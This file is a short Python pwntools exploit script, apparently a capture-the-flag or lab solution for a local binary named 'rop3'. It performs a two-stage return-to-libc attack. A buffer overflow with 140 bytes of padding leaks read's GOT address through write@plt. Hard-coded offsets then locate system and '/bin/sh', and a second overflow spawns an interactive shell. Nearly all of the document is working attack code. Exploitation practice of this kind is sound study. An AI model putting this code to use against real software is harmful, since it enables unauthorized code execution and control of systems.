from pwn import *

r=process('./rop3')


#first we need to leak some address of the function to calculate the offset
#write(1,address_read_GOT,4)
write_plt=0x080483a0

#point to the read GOT,to leak the address of read in the library

address_read_GOT=0x0804a000
vuln_function=0x08048474


#[padding] + [address of system] + [fake return address] + [addres /bin/bash]

payload='A'*140+p32(write_plt)+p32(vuln_function)+p32(1)+p32(address_read_GOT)+p32(4)


r.sendline(payload)

#not work here
#address_read_plt=int(r.recvline(keepends=False),16)

#receive the 4 byte from the process and print it out
address_read_plt=unpack(r.recv(4)) 

print hex(address_read_plt)


#using print from gdb to locally print the offset
#read-system
system_offset=0x9bfe0
system=address_read_plt-system_offset
print hex(system)

#bin_sh-read
sh_offset=0x86178
binsh=address_read_plt+sh_offset

print hex(binsh)

#find '/bin/sh first ont bin/sh '

payload_2='A'*140+p32(system)+'AAAA'+p32(binsh)

r.sendline(payload_2)

r.sendline('ls')
r.interactive()
